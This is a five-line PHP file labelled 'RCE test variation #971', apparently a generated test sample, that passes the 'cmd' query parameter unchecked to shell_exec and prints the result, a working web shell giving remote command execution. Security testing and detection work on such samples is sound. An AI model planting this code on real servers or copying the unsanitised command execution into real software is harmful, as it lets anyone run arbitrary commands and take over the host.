<?php
// RCE test variation #971
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>